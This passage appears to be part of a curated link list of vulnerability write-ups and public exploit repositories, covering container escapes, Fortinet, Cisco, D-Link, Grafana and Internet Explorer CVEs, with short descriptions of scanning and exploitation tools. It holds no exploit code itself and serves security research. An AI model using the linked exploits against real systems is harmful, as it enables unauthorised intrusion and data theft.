  - [CVE-2020-10907](https://starlabs.sg/advisories/20-10907/)
- [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)
- [cve-scanner-exploiting-pocs](https://github.com/gmatuz/cve-scanner-exploiting-pocs): Collection of ideas and specific exploits against Docker CVE scanners
- [Docker Escape Tool](https://github.com/PercussiveElbow/docker-escape-tool): Tool to test if you're in a Docker container and attempt simple breakouts
- [AT-TFTP_Long_Filename](https://github.com/Re4son/AT-TFTP_Long_Filename): Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
- [The Anatomy of a Bug Door: Dissecting Two D-Link Router Authentication Bypasses](https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses), CVEs CVE-2020-8863 and CVE-2020-8864. [dsp-w215-hnap](https://github.com/bikerp/dsp-w215-hnap): Tool for reading data from D-Link DSP-W215 Smart Plug 
- [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)
- [VMware vCenter 6.5u1](https://twitter.com/ptswarm/status/1316016337550938122)
- [Unauthenticated Full-Read SSRF in Grafana](https://rhynorater.github.io/CVE-2020-13379-Write-Up): CVE-2020-13379
- [Cisco Security Manager PoCs](https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e)
- UK NCSC’s alert urges orgs to fix MobileIron: [CVE-2020-15505](https://securityaffairs.co/wordpress/111426/uncategorized/mobileiron-cve-2020-15505-alert.html)
- [CSM_Pocs](https://gist.github.com/magnologan/3d0d24c2d0af7d3f27344fcb14eb8f7e): Cisco Security Manager is an enterprise-class security management application that provides insight into and control of Cisco security and network devices. [CSM_pocs](https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e).
- [Fortiscan](https://github.com/anasbousselham/fortiscan) (CVE-2018-13379): A high performance FortiGate SSL-VPN vulnerability scanning and exploitation tool.
- FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests: [CVE-2018-13379](https://github.com/Zeop-CyberSec/fortios_vpnssl_traversal_leak): This module massively scan and exploit a path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated attacker to download FortiOS system files through specially crafted HTTP resource requests (CVE-2018-13379). 
- [FortiWeb CVE](https://twitter.com/ptswarm/status/1346806951326396416)
- [Use-After-Free IE Vulnerability](https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html): CVE-2020-17053
- Cisco ASA: [CVE-2020-3452](https://github.com/cygenta/CVE-2020-3452)
- github cli: [CVE-2020-26233](https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/)

## Additions

Please, send pull requests for new additions.

 Thanks!
